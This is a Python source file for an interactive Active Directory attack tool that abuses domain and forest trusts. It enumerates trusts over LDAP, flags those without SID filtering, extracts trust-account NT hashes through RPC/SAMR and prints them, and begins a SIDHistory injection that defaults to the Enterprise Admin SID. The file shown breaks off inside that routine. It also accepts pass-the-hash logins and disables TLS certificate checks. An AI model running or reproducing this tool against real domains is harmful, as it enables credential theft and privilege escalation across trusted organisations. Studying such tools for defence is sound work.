#!/usr/bin/env python3
"""
    ╔═══════════════════════════════════════════════════════════╗
    ║           Cross Domain / Forest Trust Abuse               ║
    ║  Enumerate | Decode | Exploit Cross-Forest & Intra-       ║
    ║  Forest Trusts via LDAP, RPC/SAMR, and Kerberos           ║
    ╚═══════════════════════════════════════════════════════════╝
"""

import sys
import re
import ssl
import os
import socket
import struct
import signal
import logging
import hashlib
import argparse
import ipaddress
import ctypes
import getpass
import random
import string
import time
from datetime import datetime
from typing import Dict, List, Optional, Any, Tuple
from binascii import hexlify, unhexlify

# =============================================================================
# MD4 FIX: Enable legacy OpenSSL providers for NTLM authentication
# Modern systems (OpenSSL 3.x) disable MD4 by default, breaking ldap3 NTLM
# =============================================================================
def _enable_md4():
    """Try to enable MD4 support for NTLM authentication."""
    try:
        ctypes.CDLL("libssl.so.3").OSSL_PROVIDER_load(None, b"legacy")
        ctypes.CDLL("libssl.so.3").OSSL_PROVIDER_load(None, b"default")
        return True
    except:
        pass
    try:
        ctypes.CDLL("libssl.so").OSSL_PROVIDER_load(None, b"legacy")
        ctypes.CDLL("libssl.so").OSSL_PROVIDER_load(None, b"default")
        return True
    except:
        pass
    try:
        from Crypto.Hash import MD4
        return True
    except ImportError:
        pass
    return False

_MD4_ENABLED = _enable_md4()

# =============================================================================
# COLORAMA INIT
# =============================================================================
try:
    from colorama import Fore, Style, init
    init(autoreset=True)
    HAS_COLORAMA = True
except ImportError:
    HAS_COLORAMA = False
    class _DummyFore:
        def __getattr__(self, name):
            return ''
    class _DummyStyle:
        def __getattr__(self, name):
            return ''
    Fore = _DummyFore()
    Style = _DummyStyle()

logging.getLogger().setLevel(logging.ERROR)

# =============================================================================
# GLOBALS & INTERRUPT HANDLING
# =============================================================================
INTERRUPTED = False

def signal_handler(sig, frame):
    global INTERRUPTED
    INTERRUPTED = True
    print(Fore.YELLOW + "\n\n[!] Exiting... Goodbye!" + Style.RESET_ALL)
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

# =============================================================================
# BANNER
# =============================================================================
def banner():
    print(Fore.CYAN + """
    ╔═══════════════════════════════════════════════════════════╗
    ║           Cross Domain / Forest Trust Abuse               ║
    ║  Enumerate | Decode | Exploit Cross-Forest & Intra-       ║
    ║  Forest Trusts via LDAP, RPC/SAMR, and Kerberos           ║
    ╚═══════════════════════════════════════════════════════════╝
    """ + Style.RESET_ALL)

# =============================================================================
# VALIDATORS (Same style as ForceChangePassword template)
# =============================================================================
def validate_ip(ip):
    pattern = r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$'
    if not re.match(pattern, ip):
        return False
    return all(0 <= int(p) <= 255 for p in ip.split('.'))


def validate_domain(domain):
    pattern = r'^([a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}$'
    if not re.match(pattern, domain):
        return False
    for part in domain.split('.'):
        if part.startswith('-') or part.endswith('-') or not part:
            return False
    return True


def validate_hash(hash_str):
    if ':' in hash_str:
        parts = hash_str.split(':')
        if len(parts) == 2:
            lm, nt = parts
            return len(lm) == 32 and len(nt) == 32 and all(c in '0123456789abcdefABCDEF' for c in lm + nt)
        return False
    else:
        return len(hash_str) == 32 and all(c in '0123456789abcdefABCDEF' for c in hash_str)


def validate_sid(sid_str):
    """Validate Windows SID format (S-1-5-21-...)."""
    pattern = r'^S-1-5(-\d+)+$'
    return bool(re.match(pattern, sid_str))


def validate_port(port_str):
    try:
        p = int(port_str)
        return 1 <= p <= 65535
    except ValueError:
        return False


# =============================================================================
# SAFE INPUT HANDLER (Ctrl+C safe, same style as template)
# =============================================================================
def get_input(prompt, validator=None, error_msg=None, allow_empty=False, default=None):
    """Robust input handler with validation, defaults, and Ctrl+C safety."""
    while True:
        try:
            display_prompt = prompt
            if default is not None:
                display_prompt = prompt.replace(': ', ' [%s]: ' % default)

            value = input(display_prompt).strip()

            if not value and default is not None:
                value = default

            if not value and not allow_empty:
                print(Fore.RED + "[!] This field cannot be empty!" + Style.RESET_ALL)
                continue

            if validator and value and not validator(value):
                print(Fore.RED + "[!] %s" % error_msg + Style.RESET_ALL)
                continue

            return value

        except KeyboardInterrupt:
            print(Fore.YELLOW + "\n\n[!] Exiting... Goodbye!" + Style.RESET_ALL)
            sys.exit(0)
        except EOFError:
            print(Fore.YELLOW + "\n[!] Input interrupted. Returning..." + Style.RESET_ALL)
            return None


def get_password_input(prompt, validator=None, error_msg=None, default=None):
    """Secure password input with getpass."""
    while True:
        try:
            display_prompt = prompt
            if default is not None:
                display_prompt = prompt.replace(': ', ' [%s]: ' % default)

            value = getpass.getpass(display_prompt).strip()

            if not value and default is not None:
                value = default

            if not value:
                print(Fore.RED + "[!] This field cannot be empty!" + Style.RESET_ALL)
                continue

            if validator and value and not validator(value):
                print(Fore.RED + "[!] %s" % error_msg + Style.RESET_ALL)
                continue

            return value

        except KeyboardInterrupt:
            print(Fore.YELLOW + "\n\n[!] Exiting... Goodbye!" + Style.RESET_ALL)
            sys.exit(0)
        except EOFError:
            print(Fore.YELLOW + "\n[!] Input interrupted. Returning..." + Style.RESET_ALL)
            return None


# =============================================================================
# UTILITY FUNCTIONS
# =============================================================================
def get_base_dn(domain):
    """Convert domain FQDN to LDAP base DN."""
    return ','.join(["DC=%s" % part for part in domain.split('.')])


def sid_to_string(raw_sid):
    """Convert raw binary SID to string representation."""
    if not raw_sid or len(raw_sid) < 8:
        return ""
    try:
        revision = raw_sid[0]
        sub_authority_count = raw_sid[1]
        identifier_authority = int.from_bytes(raw_sid[2:8], 'big')
        sid_str = "S-%d-%d" % (revision, identifier_authority)
        offset = 8
        for i in range(sub_authority_count):
            if offset + 4 > len(raw_sid):
                break
            sub_auth = int.from_bytes(raw_sid[offset:offset+4], 'little')
            sid_str += "-%d" % sub_auth
            offset += 4
        return sid_str
    except Exception:
        return str(raw_sid)


def check_ip_reachable(ip, port=389, timeout=3):
    """Check if host is reachable on a given port."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((ip, port))
        sock.close()
        return result == 0
    except Exception:
        return False


def check_dc_ports(dc_ip):
    """Check common AD ports on DC."""
    ports = {
        53: "DNS",
        88: "Kerberos",
        135: "RPC",
        389: "LDAP",
        445: "SMB",
        636: "LDAPS",
        3268: "Global Catalog"
    }
    open_ports = []
    for port, name in ports.items():
        if check_ip_reachable(dc_ip, port, timeout=2):
            open_ports.append("%s(%d)" % (name, port))
    return open_ports


def generate_random_password(length=16):
    """Generate a strong random password."""
    chars = string.ascii_letters + string.digits + "!@#$%^&*"
    return ''.join(random.choice(chars) for _ in range(length))


# =============================================================================
# LDAP3 IMPORT (with graceful fallback)
# =============================================================================
try:
    from ldap3 import Server, Connection, ALL, NTLM, MODIFY_REPLACE, SUBTREE, LEVEL, BASE, Tls
    from ldap3.core.exceptions import LDAPException, LDAPSocketOpenError, LDAPBindError
    LDAP3_AVAILABLE = True
except ImportError:
    print(Fore.YELLOW + "[!] ldap3 library not found. Install with: pip install ldap3" + Style.RESET_ALL)
    LDAP3_AVAILABLE = False
    sys.exit(1)

# Check MD4 availability
try:
    hashlib.new("md4", b"test")
    MD4_AVAILABLE = True
except ValueError:
    MD4_AVAILABLE = False
    print(Fore.YELLOW + "[!] Warning: MD4 hash not available. NTLM auth may fail." + Style.RESET_ALL)
    print(Fore.YELLOW + "    Fix: pip install pycryptodome OR enable OpenSSL legacy provider" + Style.RESET_ALL)


# =============================================================================
# IMPACKET IMPORT (with graceful fallback)
# =============================================================================
try:
    from impacket.dcerpc.v5 import transport, samr, lsad, lsat, rpcrt
    from impacket.dcerpc.v5.dtypes import MAXIMUM_ALLOWED, NULL, RPC_UNICODE_STRING
    from impacket.dcerpc.v5.samr import USER_INFORMATION_CLASS
    from impacket.krb5.ccache import CCache
    from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
    from impacket.krb5.types import Principal, KerberosTime, Ticket
    from impacket.krb5 import constants
    from impacket.krb5.crypto import Key, _enctype_table
    from impacket.ntlm import compute_nthash
    IMPACKET_AVAILABLE = True
except ImportError:
    print(Fore.YELLOW + "[!] impacket library not found. Some features will be limited." + Style.RESET_ALL)
    print(Fore.YELLOW + "    Install with: pip install impacket" + Style.RESET_ALL)
    IMPACKET_AVAILABLE = False


# #############################################################################
# TRUST ABUSE ENGINE -- Core Class
# #############################################################################
class TrustAbuseEngine:
    """
    Cross Domain / Forest Trust Abuse Engine

    Supports:
    - CrossForestTrust exploitation
    - SameForestTrust (Intra-forest) exploitation  
    - TrustKeys extraction and abuse
    - SIDHistory injection
    - TGT forging (ExtraSIDs)
    """

    def __init__(self, dc_ip, domain, username, password, auth_type='password',
                 lmhash='', nthash='', ticket_file=''):
        self.dc_ip = dc_ip
        self.domain = domain.upper()
        self.username = username
        self.password = password
        self.auth_type = auth_type
        self.lmhash = lmhash
        self.nthash = nthash
        self.ticket_file = ticket_file
        self.conn = None
        self.trusts = []
        self.domain_sid = None
        self.base_dn = get_base_dn(domain)
        self.logger = self._setup_logger()

    def _setup_logger(self):
        """Setup file logging."""
        logger = logging.getLogger("trust_abuse")
        logger.setLevel(logging.DEBUG)

        if not logger.handlers:
            fh = logging.FileHandler("trust_abuse.log")
            fh.setLevel(logging.DEBUG)
            formatter = logging.Formatter("%(asctime)s - %(levelname)s - %(message)s")
            fh.setFormatter(formatter)
            logger.addHandler(fh)

        return logger

    # -------------------------------------------------------------------------
    # LDAP CONNECTION
    # -------------------------------------------------------------------------
    def connect_ldap(self, force=False):
        """Establish LDAP/LDAPS connection with comprehensive error handling."""
        if self.conn and not force:
            return True

        print(Fore.YELLOW + "[*] Connecting to LDAP server..." + Style.RESET_ALL)

        # Try LDAPS first
        try:
            tls = Tls(validate=ssl.CERT_NONE)
            server = Server(self.dc_ip, port=636, use_ssl=True, tls=tls, 
                          get_info=ALL, connect_timeout=10)

            if self.auth_type == 'password':
                self.conn = Connection(
                    server,
                    user="%s\\%s" % (self.domain, self.username),
                    password=self.password,
                    authentication=NTLM,
                    auto_bind=True
                )
            elif self.auth_type == 'hash':
                self.conn = Connection(
                    server,
                    user="%s\\%s" % (self.domain, self.username),
                    password=self.lmhash + ':' + self.nthash,
                    authentication=NTLM,
                    auto_bind=True
                )
            else:
                # Kerberos - try simple bind with ticket
                self.conn = Connection(
                    server,
                    authentication=NTLM,
                    auto_bind=True
                )

            print(Fore.GREEN + "[+] Connected via LDAPS (port 636)" + Style.RESET_ALL)
            self.logger.info("[+] LDAPS connection established to %s", self.dc_ip)
            return True

        except Exception as e:
            pass

        # Fallback to LDAP
        try:
            server = Server(self.dc_ip, get_info=ALL, connect_timeout=10)

            if self.auth_type == 'password':
                self.conn = Connection(
                    server,
                    user="%s\\%s" % (self.domain, self.username),
                    password=self.password,
                    authentication=NTLM,
                    auto_bind=True
                )
            elif self.auth_type == 'hash':
                self.conn = Connection(
                    server,
                    user="%s\\%s" % (self.domain, self.username),
                    password=self.lmhash + ':' + self.nthash,
                    authentication=NTLM,
                    auto_bind=True
                )
            else:
                self.conn = Connection(
                    server,
                    authentication=NTLM,
                    auto_bind=True
                )

            print(Fore.YELLOW + "[!] Connected via LDAP (port 389) - consider using LDAPS" + Style.RESET_ALL)
            self.logger.info("[+] LDAP connection established to %s", self.dc_ip)
            return True

        except LDAPBindError as e:
            err = str(e).lower()
            if "invalid credentials" in err:
                print(Fore.RED + "[-] Invalid credentials!" + Style.RESET_ALL)
            elif "stronger authentication required" in err:
                print(Fore.RED + "[-] LDAP signing required. Try LDAPS or disable signing." + Style.RESET_ALL)
            else:
                print(Fore.RED + "[-] LDAP bind failed: %s" % e + Style.RESET_ALL)
            self.logger.error("[-] LDAP bind failed: %s", e)
            return False

        except LDAPSocketOpenError as e:
            print(Fore.RED + "[-] Cannot connect to DC at %s" % self.dc_ip + Style.RESET_ALL)
            print(Fore.RED + "    -> Check: Is the IP correct? Is the DC running? Firewall?" + Style.RESET_ALL)
            self.logger.error("[-] LDAP connection failed: %s", e)
            return False

        except ValueError as e:
            err_str = str(e).lower()
            if "md4" in err_str:
                print(Fore.RED + "[-] MD4 hash algorithm not available (OpenSSL 3.x issue)" + Style.RESET_ALL)
                print(Fore.YELLOW + "    [FIX] pip install pycryptodome" + Style.RESET_ALL)
                print(Fore.YELLOW + "    [FIX] Enable OpenSSL legacy provider" + Style.RESET_ALL)
            else:
                print(Fore.RED + "[-] Value error: %s" % e + Style.RESET_ALL)
            self.logger.error("[-] LDAP ValueError: %s", e)
            return False

        except Exception as e:
            print(Fore.RED + "[-] Unexpected LDAP error: %s" % e + Style.RESET_ALL)
            self.logger.error("[-] Unexpected LDAP error: %s", e)
            return False

    # -------------------------------------------------------------------------
    # CREDENTIALS VERIFICATION
    # -------------------------------------------------------------------------
    def verify_credentials(self):
        """Verify credentials and domain via LDAP or RPC."""
        print(Fore.YELLOW + "[*] Verifying credentials and domain..." + Style.RESET_ALL)

        if self.auth_type == 'password':
            if self.connect_ldap():
                try:
                    self.conn.search(
                        search_base=self.base_dn,
                        search_filter='(objectClass=domain)',
                        search_scope=SUBTREE,
                        attributes=['dc']
                    )
                    if len(self.conn.entries) > 0:
                        print(Fore.GREEN + "[+] Credentials verified!" + Style.RESET_ALL)
                        print(Fore.GREEN + "[+] Domain '%s' verified!" % self.domain + Style.RESET_ALL)
                        return True
                except Exception:
                    pass

        # Fallback to RPC verification
        if IMPACKET_AVAILABLE:
            try:
                string_binding = 'ncacn_np:%s[\\pipe\\samr]' % self.dc_ip
                tr = transport.DCERPCTransportFactory(string_binding)

                if self.auth_type == 'hash':
                    tr.set_credentials(self.username, '', self.domain, self.lmhash, self.nthash)
                elif self.auth_type == 'ticket':
                    tr.set_credentials(self.username, '', self.domain, '', '')
                    tr.set_kerberos(True, kdcHost=self.dc_ip)
                    if self.ticket_file and os.path.exists(self.ticket_file):
                        os.environ['KRB5CCNAME'] = self.ticket_file
                else:
                    tr.set_credentials(self.username, self.password, self.domain, '', '')

                dce = tr.get_dce_rpc()
                dce.connect()
                dce.bind(samr.MSRPC_UUID_SAMR)

                resp = samr.hSamrConnect(dce)
                server_hd = resp['ServerHandle']

                resp = samr.hSamrLookupDomainInSamServer(
                    dce, server_hd, self.domain.split('.')[0]
                )

                samr.hSamrCloseHandle(dce, server_hd)
                dce.disconnect()

                print(Fore.GREEN + "[+] Credentials verified via RPC!" + Style.RESET_ALL)
                print(Fore.GREEN + "[+] Domain '%s' verified!" % self.domain + Style.RESET_ALL)
                return True

            except Exception as e:
                err = str(e).lower()
                if any(x in err for x in ['logon failure', 'access_denied', 
                    'invalid_credentials', 'status_logon_failure', 'sec_e_logon_denied']):
                    print(Fore.RED + "[-] Invalid credentials!" + Style.RESET_ALL)
                    return "invalid_credentials"
                print(Fore.RED + "[-] RPC verification failed: %s" % e + Style.RESET_ALL)

        print(Fore.RED + "[-] Domain '%s' not found or unreachable!" % self.domain + Style.RESET_ALL)
        return False

    # -------------------------------------------------------------------------
    # TRUST ENUMERATION
    # -------------------------------------------------------------------------
    def enumerate_trusts(self):
        """Enumerate all domain trusts via LDAP."""
        if not self.conn:
            print(Fore.RED + "[!] No LDAP connection. Connect first." + Style.RESET_ALL)
            return []

        print(Fore.YELLOW + "\n[*] Enumerating domain trusts..." + Style.RESET_ALL)

        try:
            self.conn.search(
                search_base=self.base_dn,
                search_filter='(objectClass=trustedDomain)',
                search_scope=SUBTREE,
                attributes=[
                    'cn', 'trustAttributes', 'trustDirection', 'trustType',
                    'trustPartner', 'flatName', 'securityIdentifier',
                    'trustAuthIncoming', 'trustAuthOutgoing', 'whenCreated',
                    'whenChanged'
                ]
            )

            self.trusts = []
            for entry in self.conn.entries:
                trust_info = {
                    'dn': str(entry.dn),
                    'cn': str(entry.get('cn', '')),
                    'trustPartner': str(entry.get('trustPartner', '')),
                    'flatName': str(entry.get('flatName', '')),
                    'trustType': self._decode_trust_type(entry.get('trustType')),
                    'trustDirection': self._decode_trust_direction(entry.get('trustDirection')),
                    'trustAttributes': self._decode_trust_attributes(entry.get('trustAttributes')),
                    'sid': str(entry.get('securityIdentifier', '')),
                    'rawAttributes': str(entry.get('trustAttributes', '0')),
                    'rawDirection': str(entry.get('trustDirection', '0')),
                    'rawType': str(entry.get('trustType', '0')),
                    'whenCreated': str(entry.get('whenCreated', '')),
                    'whenChanged': str(entry.get('whenChanged', ''))
                }
                self.trusts.append(trust_info)

                print(Fore.GREEN + "\n[+] Trust Found: %s" % trust_info['trustPartner'] + Style.RESET_ALL)
                print("    Partner:    %s%s%s" % (Fore.CYAN, trust_info['trustPartner'], Style.RESET_ALL))
                print("    Flat Name:  %s%s%s" % (Fore.CYAN, trust_info['flatName'], Style.RESET_ALL))
                print("    Type:       %s%s%s" % (Fore.YELLOW, trust_info['trustType'], Style.RESET_ALL))
                print("    Direction:  %s%s%s" % (Fore.YELLOW, trust_info['trustDirection'], Style.RESET_ALL))
                print("    Attributes: %s%s%s" % (Fore.MAGENTA, trust_info['trustAttributes'], Style.RESET_ALL))
                print("    SID:        %s%s%s" % (Fore.CYAN, trust_info['sid'], Style.RESET_ALL))

            if not self.trusts:
                print(Fore.YELLOW + "[!] No trusts found. This may be a single-domain forest." + Style.RESET_ALL)
                print(Fore.YELLOW + "    Or insufficient permissions to read trustedDomain objects." + Style.RESET_ALL)
            else:
                print(Fore.GREEN + "\n[+] Total trusts found: %d" % len(self.trusts) + Style.RESET_ALL)

            self.logger.info("[+] Found %d trust(s)", len(self.trusts))
            return self.trusts

        except Exception as e:
            print(Fore.RED + "[-] Trust enumeration failed: %s" % e + Style.RESET_ALL)
            self.logger.error("[-] Trust enumeration failed: %s", e)
            return []

    def _decode_trust_type(self, val):
        if not val:
            return "Unknown"
        types = {1: "Downlevel (NT4)", 2: "Uplevel (AD)", 
                3: "MIT Kerberos Realm", 4: "DCE (deprecated)"}
        try:
            return types.get(int(str(val)), "Type-%s" % val)
        except:
            return str(val)

    def _decode_trust_direction(self, val):
        if not val:
            return "Unknown"
        dirs = {0: "Disabled", 1: "Inbound", 2: "Outbound", 3: "Bidirectional"}
        try:
            return dirs.get(int(str(val)), "Dir-%s" % val)
        except:
            return str(val)

    def _decode_trust_attributes(self, val):
        if not val:
            return "None"
        try:
            attr_val = int(str(val))
            attrs = []
            flags = {
                0x00000001: "NON_TRANSITIVE",
                0x00000002: "UPLEVEL_ONLY",
                0x00000004: "FILTER_SIDS",
                0x00000008: "FOREST_TRANSITIVE",
                0x00000010: "CROSS_ORGANIZATION",
                0x00000020: "WITHIN_FOREST",
                0x00000040: "TREAT_AS_EXTERNAL",
                0x00000080: "TRUST_USES_RC4",
                0x00000100: "TRUST_USES_AES",
                0x00000200: "NO_TGT_DELEGATION",
                0x00000400: "PIM_TRUST"
            }
            for flag, name in flags.items():
                if attr_val & flag:
                    attrs.append(name)
            return " | ".join(attrs) if attrs else "Raw: %d" % attr_val
        except:
            return str(val)

    # -------------------------------------------------------------------------
    # TRUST DECODE & RISK ANALYSIS
    # -------------------------------------------------------------------------
    def decode_trusts(self):
        """Deep decode and risk analysis of all trusts."""
        if not self.trusts:
            print(Fore.YELLOW + "[!] No trusts to decode. Run enumerate first." + Style.RESET_ALL)
            return

        print(Fore.CYAN + "\n═══════════════════════════════════════════════════════════════" + Style.RESET_ALL)
        print(Fore.CYAN + "           TRUST DECODE -- Full Analysis" + Style.RESET_ALL)
        print(Fore.CYAN + "═══════════════════════════════════════════════════════════════" + Style.RESET_ALL)

        for i, trust in enumerate(self.trusts, 1):
            print("\n%s%sTrust #%d: %s%s" % (Fore.MAGENTA, Style.BRIGHT, i, trust['trustPartner'], Style.RESET_ALL))
            print("  DN:           %s" % trust['dn'])
            print("  Type:         %s%s%s" % (Fore.YELLOW, trust['trustType'], Style.RESET_ALL))
            print("  Direction:    %s%s%s" % (Fore.YELLOW, trust['trustDirection'], Style.RESET_ALL))
            print("  Attributes:   %s%s%s" % (Fore.MAGENTA, trust['trustAttributes'], Style.RESET_ALL))
            print("  SID:          %s%s%s" % (Fore.CYAN, trust['sid'], Style.RESET_ALL))

            # Risk Assessment
            print("\n  %s%s[ Risk Assessment ]%s" % (Fore.RED, Style.BRIGHT, Style.RESET_ALL))
            risks = []

            if "FOREST_TRANSITIVE" in trust['trustAttributes']:
                risks.append("FOREST trust -- High value target for cross-forest attacks")
            if "WITHIN_FOREST" in trust['trustAttributes']:
                risks.append("Intra-forest trust -- SIDHistory abuse possible")
            if "FILTER_SIDS" not in trust['trustAttributes'] and "CROSS_ORGANIZATION" not in trust['trustAttributes']:
                if trust['trustDirection'] in ("Inbound", "Bidirectional"):
                    risks.append("SID filtering NOT enabled -- VULNERABLE to SIDHistory injection!")
            if "TRUST_USES_RC4" in trust['trustAttributes']:
                risks.append("RC4 encryption enabled -- Kerberoasting / TGT forging possible")
            if "NON_TRANSITIVE" in trust['trustAttributes']:
                risks.append("Non-transitive trust -- Limits lateral movement scope")

            if risks:
                for risk in risks:
                    print("    %s⚠ %s%s" % (Fore.RED, risk, Style.RESET_ALL))
            else:
                print("    %s✓ No immediate risks identified%s" % (Fore.GREEN, Style.RESET_ALL))

            print(Fore.CYAN + "─────────────────────────────────────────────────────────────" + Style.RESET_ALL)

    # -------------------------------------------------------------------------
    # SID FILTERING CHECK
    # -------------------------------------------------------------------------
    def check_sid_filtering(self):
        """Check SID filtering status on all trusts."""
        if not self.trusts:
            print(Fore.YELLOW + "[!] No trusts to check. Run enumerate first." + Style.RESET_ALL)
            return

        print(Fore.CYAN + "\n═══════════════════════════════════════════════════════════════" + Style.RESET_ALL)
        print(Fore.CYAN + "           SID FILTERING STATUS" + Style.RESET_ALL)
        print(Fore.CYAN + "═══════════════════════════════════════════════════════════════" + Style.RESET_ALL)

        for trust in self.trusts:
            partner = trust['trustPartner']
            attrs = trust['trustAttributes']

            print("\n%s%sTrust: %s%s" % (Fore.WHITE, Style.BRIGHT, partner, Style.RESET_ALL))

            if "FILTER_SIDS" in attrs or "QUARANTINED" in attrs:
                print("  %s✓ SID Filtering ENABLED%s" % (Fore.GREEN, Style.RESET_ALL))
                print("  %s    -> SIDHistory attacks BLOCKED%s" % (Fore.GREEN, Style.RESET_ALL))
            else:
                print("  %s✗ SID Filtering DISABLED%s" % (Fore.RED, Style.RESET_ALL))
                print("  %s    -> VULNERABLE to SIDHistory injection!%s" % (Fore.RED, Style.RESET_ALL))
                print("  %s    -> Attack: Inject Enterprise Admin SID from trusted domain%s" % (Fore.RED, Style.RESET_ALL))

            if "FOREST_TRANSITIVE" in attrs:
                print("  %s! Forest transitive trust -- Check selective authentication%s" % (Fore.YELLOW, Style.RESET_ALL))

            if "WITHIN_FOREST" in attrs:
                print("  %s! Intra-forest trust -- No SID filtering by design%s" % (Fore.YELLOW, Style.RESET_ALL))
                print("  %s    -> All SIDs are transitive within the forest%s" % (Fore.YELLOW, Style.RESET_ALL))

        print(Fore.CYAN + "═══════════════════════════════════════════════════════════════" + Style.RESET_ALL)

    # -------------------------------------------------------------------------
    # GET DOMAIN SID
    # -------------------------------------------------------------------------
    def get_domain_sid(self):
        """Get the current domain SID via LDAP."""
        if not self.conn:
            print(Fore.RED + "[!] No LDAP connection." + Style.RESET_ALL)
            return None

        try:
            self.conn.search(
                search_base=self.base_dn,
                search_filter='(objectClass=domain)',
                search_scope=BASE,
                attributes=['objectSid']
            )

            if self.conn.entries:
                sid = str(self.conn.entries[0].get('objectSid', ''))
                self.domain_sid = sid
                print(Fore.GREEN + "[+] Domain SID: %s" % sid + Style.RESET_ALL)
                return sid
        except Exception as e:
            print(Fore.RED + "[-] Failed to get domain SID: %s" % e + Style.RESET_ALL)

        return None

    # -------------------------------------------------------------------------
    # TRUST KEY EXTRACTION (via RPC SAMR)
    # -------------------------------------------------------------------------
    def extract_trust_keys(self):
        """
        Extract trust keys via RPC SAMR.
        This requires Domain Admin or equivalent privileges.
        """
        if not IMPACKET_AVAILABLE:
            print(Fore.RED + "[!] impacket required for trust key extraction." + Style.RESET_ALL)
            return None

        print(Fore.CYAN + "\n═══════════════════════════════════════════════════════════════" + Style.RESET_ALL)
        print(Fore.CYAN + "           TRUST KEY EXTRACTION" + Style.RESET_ALL)
        print(Fore.CYAN + "═══════════════════════════════════════════════════════════════" + Style.RESET_ALL)
        print(Fore.YELLOW + "  Requires Domain Admin or equivalent privileges\n" + Style.RESET_ALL)

        trust_keys = {}

        for trust in self.trusts:
            partner = trust['trustPartner']
            print(Fore.YELLOW + "[*] Attempting to extract trust key for: %s" % partner + Style.RESET_ALL)

            try:
                string_binding = 'ncacn_np:%s[\\pipe\\samr]' % self.dc_ip
                tr = transport.DCERPCTransportFactory(string_binding)

                if self.auth_type == 'hash':
                    tr.set_credentials(self.username, '', self.domain, self.lmhash, self.nthash)
                elif self.auth_type == 'ticket':
                    tr.set_credentials(self.username, '', self.domain, '', '')
                    tr.set_kerberos(True, kdcHost=self.dc_ip)
                    if self.ticket_file and os.path.exists(self.ticket_file):
                        os.environ['KRB5CCNAME'] = self.ticket_file
                else:
                    tr.set_credentials(self.username, self.password, self.domain, '', '')

                dce = tr.get_dce_rpc()
                dce.connect()
                dce.bind(samr.MSRPC_UUID_SAMR)

                # Connect to SAM server
                resp = samr.hSamrConnect(dce)
                server_hd = resp['ServerHandle']

                # Open domain
                domain_name = self.domain.split('.')[0]
                resp = samr.hSamrLookupDomainInSamServer(dce, server_hd, domain_name)
                domain_sid = resp['DomainId']

                resp = samr.hSamrOpenDomain(dce, server_hd, domainId=domain_sid)
                domain_hd = resp['DomainHandle']

                # Lookup trust account (format: DOMAIN$)
                trust_account = partner.split('.')[0].upper() + '$'

                try:
                    resp = samr.hSamrLookupNamesInDomain(dce, domain_hd, [trust_account])
                    user_rid = resp['RelativeIds']['Element'][0]['Data']

                    # Open user to get hashes
                    resp = samr.hSamrOpenUser(dce, domain_hd, MAXIMUM_ALLOWED, user_rid)
                    user_hd = resp['UserHandle']

                    # Query user info (level 21 for internal info)
                    try:
                        resp = samr.hSamrQueryInformationUser2(dce, user_hd, samr.USER_INFORMATION_CLASS.UserAllInformation)
                        all_info = resp['Buffer']['All']

                        # Extract NTLM hash if available
                        lm_owf = all_info['LmOwfPassword']['Buffer']
                        nt_owf = all_info['NtOwfPassword']['Buffer']

                        if lm_owf and len(lm_owf) == 16:
                            lm_hash = hexlify(lm_owf).decode()
                        else:
                            lm_hash = 'aad3b435b51404eeaad3b435b51404ee'

                        if nt_owf and len(nt_owf) == 16:
                            nt_hash = hexlify(nt_owf).decode()
                        else:
                            nt_hash = None

                        if nt_hash:
                            trust_keys[partner] = {
                                'lm_hash': lm_hash,
                                'nt_hash': nt_hash,
                                'account': trust_account
                            }
                            print(Fore.GREEN + "[+] Extracted trust key for %s" % partner + Style.RESET_ALL)
                            print("    Account: %s" % trust_account)
                            print("    NT Hash: %s" % nt_hash)

                        samr.hSamrCloseHandle(dce, user_hd)

                    except Exception as e:
                        print(Fore.YELLOW + "[!] Could not query user info: %s" % e + Style.RESET_ALL)
                        samr.hSamrCloseHandle(dce, user_hd)

                except Exception as e:
                    print(Fore.YELLOW + "[!] Trust account %s not found: %s" % (trust_account, e) + Style.RESET_ALL)

                samr.hSamrCloseHandle(dce, domain_hd)
                samr.hSamrCloseHandle(dce, server_hd)
                dce.disconnect()

            except Exception as e:
                print(Fore.RED + "[-] Failed to extract trust key for %s: %s" % (partner, e) + Style.RESET_ALL)

        if not trust_keys:
            print(Fore.YELLOW + "\n[!] No trust keys extracted. Possible reasons:" + Style.RESET_ALL)
            print(Fore.YELLOW + "    - Insufficient privileges (need Domain Admin)" + Style.RESET_ALL)
            print(Fore.YELLOW + "    - Trust account does not exist in SAM" + Style.RESET_ALL)
            print(Fore.YELLOW + "    - RPC access denied" + Style.RESET_ALL)

        return trust_keys

    # -------------------------------------------------------------------------
    # INTRA-FOREST SIDHistory ABUSE
    # -------------------------------------------------------------------------
    def intra_forest_abuse(self, target_user=None, target_sid=None):
        """
        Intra-forest trust abuse via SIDHistory injection.
        In intra-forest trusts, SID filtering is disabled by design.
        """
        if not self.trusts:
            print(Fore.YELLOW + "[!] No trusts found. Run enumerate first." + Style.RESET_ALL)
            return False

        intra_trusts = [t for t in self.trusts if "WITHIN_FOREST" in t['trustAttributes']]
        if not intra_trusts:
            print(Fore.YELLOW + "[!] No intra-forest trusts found." + Style.RESET_ALL)
            return False

        print(Fore.CYAN + "\n═══════════════════════════════════════════════════════════════" + Style.RESET_ALL)
        print(Fore.CYAN + "           INTRA-FOREST SIDHistory ABUSE" + Style.RESET_ALL)
        print(Fore.CYAN + "═══════════════════════════════════════════════════════════════" + Style.RESET_ALL)
        print(Fore.YELLOW + "  Intra-forest trusts have NO SID filtering by design." + Style.RESET_ALL)
        print(Fore.YELLOW + "  Any SID from any domain in the forest is valid everywhere.\n" + Style.RESET_ALL)

        # Get domain SID if not already known
        if not self.domain_sid:
            self.get_domain_sid()

        # Default Enterprise Admin SID suffix
        enterprise_admin_sid = None
        if self.domain_sid:
            base_sid = '-'.join(self.domain_sid.split('-')[:-1])
            enterprise_admin_sid = "%s-519" % base_sid

        if target_user:
            print(Fore.YELLOW + "[*] Target user for SIDHistory injection: %s" % target_user + Style.RESET_ALL)
        else:
            target_user = get_input(
                Fore.CYAN + "[?] Target username for SIDHistory injection: " + Style.RESET_ALL
            )

        if target_sid:
            print(Fore.YELLOW + "[*] SID to inject: %s" % target_sid + Style.RESET_ALL)
        else:
            if enterprise_admin_sid:
                print(Fore.YELLOW + "[*] Default Enterprise Admin SID: %s" % enterprise_admin_sid + Style.RESET_ALL)
                use_default = get_input(
                    Fore.CYAN + "[?] Use default Enterprise Admin SID? (Y/n): " + Style.RESET_ALL,
                    default="Y"
                )
